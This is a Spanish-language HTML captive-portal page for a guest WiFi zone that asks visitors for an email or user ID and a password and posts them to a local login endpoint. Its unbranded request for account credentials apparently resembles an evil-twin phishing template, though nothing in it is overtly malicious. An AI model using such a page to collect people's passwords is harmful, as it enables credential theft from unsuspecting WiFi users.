<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Acceso - Zona WiFi</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #e9e9e9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 350px;
            text-align: center;
        }
        .wifi-icon {
            width: 80px;
            height: 80px;
            background-color: #0078d7;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }
        .wifi-icon svg {
            width: 50px;
            height: 50px;
            fill: white;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #0078d7;
        }
        p {
            margin-bottom: 30px;
            font-size: 14px;
            color: #666;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box; 
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #0078d7;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background-color: #005a9e;
        }
        .disclaimer {
            font-size: 11px;
            color: #999;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="wifi-icon">
            <svg viewBox="0 0 24 24">
                <path d="M12 6c3.5 0 6.58 1.25 9 3.32l-2.06 2.06C17.39 9.94 14.86 9 12 9c-2.86 0-5.39.94-6.94 2.38L3 9.32C5.42 8.25 8.5 6 12 6zm0 6c2.21 0 4.21.9 5.66 2.34l-2.07 2.07C14.73 15.65 13.43 15 12 15s-2.73.65-3.59 1.41l-2.07-2.07C7.79 12.9 9.79 12 12 12zm0 6c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1z"/>
            </svg>
        </div>
        
        <h1>Zona WiFi Invitados</h1>
        <p>Bienvenido a nuestra red de alta velocidad. Por favor, inicia sesión para verificar tu identidad y disfrutar de navegación ilimitada.</p>
        
        <form action="/wifi-login" method="POST">
            <input type="email" name="email" placeholder="Correo electrónico o ID de usuario" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Conectar</button>
        </form>

        <div class="disclaimer">
            Al hacer clic en conectar, aceptas los Términos y Condiciones del servicio.
        </div>
    </div>
</body>
</html>
